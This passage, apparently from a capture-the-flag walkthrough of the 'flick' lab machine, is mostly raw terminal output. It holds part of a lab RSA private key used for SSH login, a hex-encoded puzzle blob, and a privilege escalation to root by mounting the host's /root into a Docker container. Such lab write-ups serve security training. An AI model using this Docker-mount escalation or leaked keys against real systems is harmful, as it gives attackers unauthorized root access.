mX+nwxh6qIP2nADkaQOnzrHgtOn4kiruRGbki0AhpfQF46qrssVnwF5Vfcrvmstf
JqDFAoGBAI9KJamhco8BBka0PUWgJ3R2ZqE1viTvyME1G25h7tJb17cIeB/PeTS1
Q9KMFl61gpl0J4rJEIakeGpXuehwYAzNBv7n6yr8CNDNkET/cVhp+LCmbS91FwAK
VP0mqDppzOZ04B9FQD8Af6kUzxzGFH8tAN5SNYSW88I9Z8lVpfkn
-----END RSA PRIVATE KEY-----

root@kali:~# chmod 400 id_rsa 
root@kali:~# ssh robin@192.168.174.138 -i id_rsa 

\x56\x6d\x30\x77\x64\x32\x51\x79\x55\x58\x6c\x56\x57\x47\x78\x57\x56\x30\x64\x34
\x56\x31\x59\x77\x5a\x44\x52\x57\x4d\x56\x6c\x33\x57\x6b\x52\x53\x57\x46\x4a\x74
\x65\x46\x5a\x56\x4d\x6a\x41\x31\x56\x6a\x41\x78\x56\x32\x4a\x45\x54\x6c\x68\x68
\x4d\x6b\x30\x78\x56\x6d\x70\x4b\x53\x31\x49\x79\x53\x6b\x56\x55\x62\x47\x68\x6f
\x54\x56\x68\x43\x55\x56\x5a\x74\x65\x46\x5a\x6c\x52\x6c\x6c\x35\x56\x47\x74\x73
\x61\x6c\x4a\x74\x61\x47\x39\x55\x56\x6d\x68\x44\x56\x56\x5a\x61\x63\x56\x46\x74
\x52\x6c\x70\x57\x4d\x44\x45\x31\x56\x54\x4a\x30\x56\x31\x5a\x58\x53\x6b\x68\x68
\x52\x7a\x6c\x56\x56\x6d\x78\x61\x4d\x31\x5a\x73\x57\x6d\x46\x6b\x52\x30\x35\x47
\x57\x6b\x5a\x53\x54\x6d\x46\x36\x52\x54\x46\x57\x56\x45\x6f\x77\x56\x6a\x46\x61
\x57\x46\x4e\x72\x61\x47\x68\x53\x65\x6d\x78\x57\x56\x6d\x70\x4f\x54\x30\x30\x78
\x63\x46\x5a\x58\x62\x55\x5a\x72\x55\x6a\x41\x31\x52\x31\x64\x72\x57\x6e\x64\x57
\x4d\x44\x46\x46\x55\x6c\x52\x47\x56\x31\x5a\x46\x62\x33\x64\x57\x61\x6b\x5a\x68
\x56\x30\x5a\x4f\x63\x6d\x46\x48\x61\x46\x4e\x6c\x62\x58\x68\x58\x56\x6d\x30\x78
\x4e\x46\x6c\x56\x4d\x48\x68\x58\x62\x6b\x35\x59\x59\x6c\x56\x61\x63\x6c\x56\x71
\x51\x54\x46\x53\x4d\x57\x52\x79\x56\x32\x78\x4f\x56\x57\x4a\x56\x63\x45\x64\x5a
\x4d\x46\x5a\x33\x56\x6a\x4a\x4b\x56\x56\x4a\x59\x5a\x46\x70\x6c\x61\x33\x42\x49
\x56\x6d\x70\x47\x54\x32\x52\x57\x56\x6e\x52\x68\x52\x6b\x35\x73\x59\x6c\x68\x6f
\x57\x46\x5a\x74\x4d\x58\x64\x55\x4d\x56\x46\x33\x54\x55\x68\x6f\x61\x6c\x4a\x73
\x63\x46\x6c\x5a\x62\x46\x5a\x68\x59\x32\x78\x57\x63\x56\x46\x55\x52\x6c\x4e\x4e
\x56\x6c\x59\x31\x56\x46\x5a\x53\x55\x31\x5a\x72\x4d\x58\x4a\x6a\x52\x6d\x68\x57
\x54\x57\x35\x53\x4d\x31\x5a\x71\x53\x6b\x74\x57\x56\x6b\x70\x5a\x57\x6b\x5a\x77
\x62\x47\x45\x7a\x51\x6b\x6c\x57\x62\x58\x42\x48\x56\x44\x4a\x53\x56\x31\x5a\x75
\x55\x6d\x68\x53\x61\x7a\x56\x7a\x57\x57\x78\x6f\x62\x31\x64\x47\x57\x6e\x52\x4e
\x53\x47\x68\x50\x55\x6d\x31\x34\x56\x31\x52\x56\x61\x47\x39\x58\x52\x30\x70\x79
\x54\x6c\x5a\x73\x57\x6d\x4a\x47\x57\x6d\x68\x5a\x4d\x6e\x68\x58\x59\x7a\x46\x57
\x63\x6c\x70\x47\x61\x47\x6c\x53\x4d\x31\x46\x36\x56\x6a\x4a\x30\x55\x31\x55\x78
\x57\x6e\x4a\x4e\x57\x45\x70\x71\x55\x6d\x31\x6f\x56\x31\x52\x58\x4e\x56\x4e\x4e
\x4d\x56\x70\x78\x55\x32\x74\x30\x56\x31\x5a\x72\x63\x46\x70\x58\x61\x31\x70\x33
\x56\x6a\x46\x4b\x56\x32\x4e\x49\x62\x46\x64\x57\x52\x55\x70\x6f\x56\x6b\x52\x4b
\x54\x32\x52\x47\x53\x6e\x4a\x61\x52\x6d\x68\x70\x56\x6a\x4e\x6f\x56\x56\x64\x57
\x55\x6b\x39\x52\x4d\x57\x52\x48\x56\x32\x35\x53\x54\x6c\x5a\x46\x53\x6c\x68\x55
\x56\x33\x68\x48\x54\x6c\x5a\x61\x57\x45\x35\x56\x4f\x56\x68\x53\x4d\x48\x42\x4a
\x56\x6c\x64\x34\x63\x31\x64\x74\x53\x6b\x68\x68\x52\x6c\x4a\x58\x54\x55\x5a\x77
\x56\x46\x5a\x71\x52\x6e\x64\x53\x4d\x56\x4a\x30\x5a\x55\x64\x73\x55\x32\x4a\x59
\x59\x33\x68\x57\x61\x31\x70\x68\x56\x54\x46\x56\x65\x46\x64\x75\x53\x6b\x35\x58
\x52\x58\x42\x78\x56\x57\x78\x6b\x4e\x47\x46\x47\x56\x58\x64\x68\x52\x55\x35\x55
\x55\x6d\x78\x77\x65\x46\x55\x79\x64\x47\x46\x69\x52\x6c\x70\x7a\x56\x32\x78\x77
\x57\x47\x45\x78\x63\x44\x4e\x5a\x61\x32\x52\x47\x5a\x57\x78\x47\x63\x6d\x4a\x47
\x5a\x46\x64\x4e\x4d\x45\x70\x4a\x56\x6d\x74\x53\x53\x31\x55\x78\x57\x58\x68\x57
\x62\x6c\x5a\x57\x59\x6c\x68\x43\x56\x46\x6c\x72\x56\x6e\x64\x57\x56\x6c\x70\x30
\x5a\x55\x63\x35\x55\x6b\x31\x58\x55\x6e\x70\x57\x4d\x6a\x56\x4c\x56\x30\x64\x4b
\x53\x46\x56\x74\x4f\x56\x56\x57\x62\x48\x42\x59\x56\x47\x78\x61\x59\x56\x64\x48
\x56\x6b\x68\x6b\x52\x32\x68\x70\x55\x6c\x68\x42\x64\x31\x64\x57\x56\x6d\x39\x55
\x4d\x56\x70\x30\x55\x6d\x35\x4b\x54\x31\x5a\x73\x53\x6c\x68\x55\x56\x6c\x70\x33
\x56\x30\x5a\x72\x65\x46\x64\x72\x64\x47\x70\x69\x56\x6b\x70\x49\x56\x6c\x64\x34
\x61\x32\x46\x57\x53\x6e\x52\x50\x56\x45\x35\x58\x54\x57\x35\x6f\x57\x46\x6c\x71
\x53\x6b\x5a\x6c\x52\x6d\x52\x5a\x57\x6b\x55\x31\x56\x31\x5a\x73\x63\x46\x56\x58
\x56\x33\x52\x72\x56\x54\x46\x73\x56\x31\x56\x73\x57\x6c\x68\x69\x56\x56\x70\x7a
\x57\x57\x74\x61\x64\x32\x56\x47\x56\x58\x6c\x6b\x52\x45\x4a\x58\x54\x56\x5a\x77
\x65\x56\x59\x79\x65\x48\x64\x58\x62\x46\x70\x58\x59\x30\x68\x4b\x56\x31\x5a\x46
\x57\x6b\x78\x57\x4d\x56\x70\x48\x59\x32\x31\x4b\x52\x31\x70\x47\x5a\x45\x35\x4e
\x52\x58\x42\x4b\x56\x6d\x31\x30\x55\x31\x4d\x78\x56\x58\x68\x58\x57\x47\x68\x68
\x55\x30\x5a\x61\x56\x6c\x6c\x72\x57\x6b\x74\x6a\x52\x6c\x70\x78\x56\x47\x30\x35
\x56\x31\x5a\x73\x63\x45\x68\x58\x56\x45\x35\x76\x59\x56\x55\x78\x57\x46\x56\x75
\x63\x46\x64\x4e\x56\x32\x68\x32\x56\x31\x5a\x61\x53\x31\x49\x78\x54\x6e\x56\x52
\x62\x46\x5a\x58\x54\x54\x46\x4b\x4e\x6c\x5a\x48\x64\x47\x46\x68\x4d\x6b\x35\x7a
\x56\x32\x35\x53\x61\x31\x4a\x74\x55\x6e\x42\x57\x62\x47\x68\x44\x54\x6c\x5a\x6b
\x56\x56\x46\x74\x52\x6d\x70\x4e\x56\x31\x49\x77\x56\x54\x4a\x30\x61\x31\x64\x48
\x53\x6c\x68\x68\x52\x30\x5a\x56\x56\x6d\x78\x77\x4d\x31\x70\x58\x65\x48\x4a\x6c
\x56\x31\x5a\x49\x5a\x45\x64\x30\x55\x32\x45\x7a\x51\x58\x64\x58\x62\x46\x5a\x68
\x59\x54\x4a\x47\x56\x31\x64\x75\x53\x6d\x6c\x6c\x61\x31\x70\x59\x57\x57\x78\x6f
\x51\x31\x52\x47\x55\x6e\x4a\x58\x62\x45\x70\x73\x55\x6d\x31\x53\x65\x6c\x6c\x56
\x57\x6c\x4e\x68\x56\x6b\x70\x31\x55\x57\x78\x77\x56\x32\x4a\x59\x55\x6c\x68\x61
\x52\x45\x5a\x72\x55\x6a\x4a\x4b\x53\x56\x52\x74\x61\x46\x4e\x57\x56\x46\x5a\x61
\x56\x6c\x63\x78\x4e\x47\x51\x79\x56\x6b\x64\x57\x62\x6c\x4a\x72\x55\x6b\x56\x4b
\x62\x31\x6c\x59\x63\x45\x64\x6c\x56\x6c\x4a\x7a\x56\x6d\x35\x4f\x57\x47\x4a\x47
\x63\x46\x68\x5a\x4d\x47\x68\x4c\x56\x32\x78\x61\x57\x46\x56\x72\x5a\x47\x46\x57
\x56\x31\x4a\x51\x56\x54\x42\x6b\x52\x31\x49\x79\x52\x6b\x68\x69\x52\x6b\x35\x70
\x59\x54\x42\x77\x4d\x6c\x5a\x74\x4d\x54\x42\x56\x4d\x55\x31\x34\x56\x56\x68\x73
\x56\x56\x64\x48\x65\x46\x5a\x5a\x56\x45\x5a\x33\x59\x55\x5a\x57\x63\x56\x4e\x74
\x4f\x56\x64\x53\x62\x45\x70\x5a\x56\x47\x78\x6a\x4e\x57\x45\x79\x53\x6b\x64\x6a
\x52\x57\x68\x58\x59\x6c\x52\x42\x4d\x56\x5a\x58\x63\x33\x68\x58\x52\x6c\x5a\x7a
\x59\x55\x5a\x6b\x54\x6c\x59\x79\x61\x44\x4a\x57\x61\x6b\x4a\x72\x55\x7a\x46\x6b
\x56\x31\x5a\x75\x53\x6c\x42\x57\x62\x48\x42\x76\x57\x56\x52\x47\x64\x31\x4e\x57
\x57\x6b\x68\x6c\x52\x30\x5a\x61\x56\x6d\x31\x53\x52\x31\x52\x73\x57\x6d\x46\x56
\x52\x6c\x6c\x35\x59\x55\x5a\x6f\x57\x6c\x64\x49\x51\x6c\x68\x56\x4d\x46\x70\x68
\x59\x31\x5a\x4f\x63\x56\x56\x73\x57\x6b\x35\x57\x4d\x55\x6c\x33\x56\x6c\x52\x4b
\x4d\x47\x49\x79\x52\x6b\x64\x54\x62\x6b\x35\x55\x59\x6b\x64\x6f\x56\x6c\x5a\x73
\x57\x6e\x64\x4e\x4d\x56\x70\x79\x56\x32\x31\x47\x61\x6c\x5a\x72\x63\x44\x42\x61
\x52\x57\x51\x77\x56\x6a\x4a\x4b\x63\x6c\x4e\x72\x61\x46\x64\x53\x4d\x32\x68\x6f
\x56\x6b\x52\x4b\x52\x31\x59\x78\x54\x6e\x56\x56\x62\x45\x4a\x58\x55\x6c\x52\x57
\x57\x56\x64\x57\x55\x6b\x64\x6b\x4d\x6b\x5a\x48\x56\x32\x78\x57\x55\x32\x45\x78
\x63\x48\x4e\x56\x62\x54\x46\x54\x5a\x57\x78\x73\x56\x6c\x64\x73\x54\x6d\x68\x53
\x56\x45\x5a\x61\x56\x56\x63\x31\x62\x31\x59\x78\x57\x58\x70\x68\x53\x45\x70\x61
\x59\x57\x74\x61\x63\x6c\x56\x71\x52\x6c\x64\x6a\x4d\x6b\x5a\x47\x54\x31\x5a\x6b
\x56\x31\x5a\x47\x57\x6d\x46\x57\x62\x47\x4e\x34\x54\x6b\x64\x52\x65\x56\x5a\x72
\x5a\x46\x64\x69\x62\x45\x70\x79\x56\x57\x74\x57\x53\x32\x49\x78\x62\x46\x6c\x6a
\x52\x57\x52\x73\x56\x6d\x78\x4b\x65\x6c\x5a\x74\x4d\x44\x56\x58\x52\x30\x70\x48
\x59\x30\x5a\x6f\x57\x6b\x31\x48\x61\x45\x78\x57\x4d\x6e\x68\x68\x56\x30\x5a\x57
\x63\x6c\x70\x48\x52\x6c\x64\x4e\x4d\x6d\x68\x4a\x56\x31\x52\x4a\x65\x46\x4d\x78
\x53\x58\x68\x6a\x52\x57\x52\x68\x55\x6d\x73\x31\x57\x46\x59\x77\x56\x6b\x74\x4e
\x62\x46\x70\x30\x59\x30\x56\x6b\x57\x6c\x59\x77\x56\x6a\x52\x57\x62\x47\x68\x76
\x56\x30\x5a\x6b\x53\x47\x46\x47\x57\x6c\x70\x69\x57\x47\x68\x6f\x56\x6d\x31\x34
\x63\x32\x4e\x73\x5a\x48\x4a\x6b\x52\x33\x42\x54\x59\x6b\x5a\x77\x4e\x46\x5a\x58
\x4d\x54\x42\x4e\x52\x6c\x6c\x34\x56\x32\x35\x4f\x61\x6c\x4a\x58\x61\x46\x68\x57
\x61\x6b\x35\x54\x56\x45\x5a\x73\x56\x56\x46\x59\x61\x46\x4e\x57\x61\x33\x42\x36
\x56\x6b\x64\x34\x59\x56\x55\x79\x53\x6b\x5a\x58\x57\x48\x42\x58\x56\x6c\x5a\x77
\x52\x31\x51\x78\x57\x6b\x4e\x56\x62\x45\x4a\x56\x54\x55\x51\x77\x50\x51\x3d\x3d

 .o88o. oooo   o8o            oooo        
 888 `" `888   `"'            `888        
o888oo   888  oooo   .ooooo.   888  oooo  
 888     888  `888  d88' `"Y8  888 .8P'   
 888     888   888  888        888888.    
 888     888   888  888   .o8  888 `88b.  
o888o   o888o o888o `Y8bod8P' o888o o888o 
                                          

Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

  System information as of Mon Nov 23 20:27:06 SAST 2015

  System load:  0.0               Processes:              120
  Usage of /:   35.8% of 6.99GB   Users logged in:        1
  Memory usage: 52%               IP address for eth0:    192.168.174.138
  Swap usage:   0%                IP address for docker0: 172.17.42.1

  Graph this data and manage this system at:
    https://landscape.canonical.com/

New release '14.04.3 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Sat Aug  2 12:43:16 2014 from 192.168.56.1
robin@flick:~$ sudo -l
Matching Defaults entries for robin on this host:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User robin may run the following commands on this host:
    (root) NOPASSWD: /opt/start_apache/restart.sh
robin@flick:~$ 
robin@flick:~$ sudo -l
Matching Defaults entries for robin on this host:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User robin may run the following commands on this host:
    (root) NOPASSWD: /opt/start_apache/restart.sh
robin@flick:~$ 
robin@flick:~$ cat /opt/start_apache/restart.sh 
cat: /opt/start_apache/restart.sh: Permission denied
robin@flick:~$ 

Docker
https://en.wikipedia.org/wiki/Docker_(software)
robin@flick:~$ docker -v
Docker version 0.11.0, build 15209c3
robin@flick:~$ docker version 
Client version: 0.11.0
Client API version: 1.11
Go version (client): go1.2.1
Git commit (client): 15209c3
Server version: 0.11.0
Server API version: 1.11
Git commit (server): 15209c3
Go version (server): go1.2.1
Last stable version: 1.9.1, please update docker
robin@flick:~$ 
Issuing command that run in a container
robin@flick:~$ docker ps -l
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                     PORTS               NAMES
b0f71c63a88c        ubuntu:14.04        /bin/bash           15 months ago       Exited (0) 15 months ago                       sharp_shockley      
robin@flick:~$ docker run ubuntu id
uid=0(root) gid=0(root) groups=0(root)
robin@flick:~$ docker run ubuntu ls -l /home
total 0
robin@flick:~$ docker run ubuntu ls -l /root
total 0
robin@flick:~$ docker run -t -i -v /root:/root ubuntu /bin/bash
root@67a590d03ef1:/# ls -lah
total 17M
drwxr-xr-x  46 root root 4.0K Nov 23 18:54 .
drwxr-xr-x  46 root root 4.0K Nov 23 18:54 ..
-rwxr-xr-x   1 root root    0 Nov 23 18:54 .dockerenv
-rwx------   1 root root  17M Nov 23  2015 .dockerinit
drwxr-xr-x   2 root root 4.0K Jul 17  2014 bin
drwxr-xr-x   2 root root 4.0K Apr 10  2014 boot
drwxr-xr-x   4 root root  240 Nov 23 18:54 dev
drwxr-xr-x  64 root root 4.0K Nov 23 18:54 etc
drwxr-xr-x   2 root root 4.0K Apr 10  2014 home
drwxr-xr-x  12 root root 4.0K Jul 17  2014 lib
drwxr-xr-x   2 root root 4.0K Jul 17  2014 lib64
drwxr-xr-x   2 root root 4.0K Jul 17  2014 media
drwxr-xr-x   2 root root 4.0K Apr 10  2014 mnt
drwxr-xr-x   2 root root 4.0K Jul 17  2014 opt
dr-xr-xr-x 140 root root    0 Nov 23 18:54 proc
drwx------   5 root root 4.0K Aug  6  2014 root
drwxr-xr-x   7 root root 4.0K Jul 17  2014 run
drwxr-xr-x   2 root root 4.0K Jul 21  2014 sbin
drwxr-xr-x   2 root root 4.0K Jul 17  2014 srv
dr-xr-xr-x  13 root root    0 Nov 23 18:54 sys
drwxrwxrwt   2 root root 4.0K Jul 17  2014 tmp
drwxr-xr-x  11 root root 4.0K Jul 17  2014 usr
drwxr-xr-x  13 root root 4.0K Jul 17  2014 var
root@67a590d03ef1:/# 
root@67a590d03ef1:/# cd /root
root@67a590d03ef1:/root# ls -lah
total 56K
drwx------  5 root root 4.0K Aug  6  2014 .
drwxr-xr-x 46 root root 4.0K Nov 23 18:54 ..
drwx------  2 root root 4.0K Aug  4  2014 .aptitude
-rw-------  1 root root   27 Aug  6  2014 .bash_history
-rw-r--r--  1 root root 3.1K Apr 19  2012 .bashrc
drwx------  2 root root 4.0K Aug  1  2014 .cache
-rw-r--r--  1 root root  140 Apr 19  2012 .profile
-rw-------  1 root root  17K Aug  5  2014 .viminfo
drwxr-xr-x  2 root root 4.0K Aug  1  2014 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc
-rw-r--r--  1 root root   67 Aug  1  2014 flag.txt
root@67a590d03ef1:/root# cat flag.txt 
Errr, you are close, but this is not the flag you are looking for.
root@67a590d03ef1:/root# cd 53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc/
root@67a590d03ef1:/root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc# ls
real_flag.txt
root@67a590d03ef1:/root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc# cat real_flag.txt 
Congrats!

You have completed 'flick'! I hope you have enjoyed doing it as much as I did creating it :)

ciao for now!
@leonjza
root@67a590d03ef1:/root/53ca1c96115a7c156b14306b81df8f34e8a4bf8933cb687bd9334616f475dcbc# 
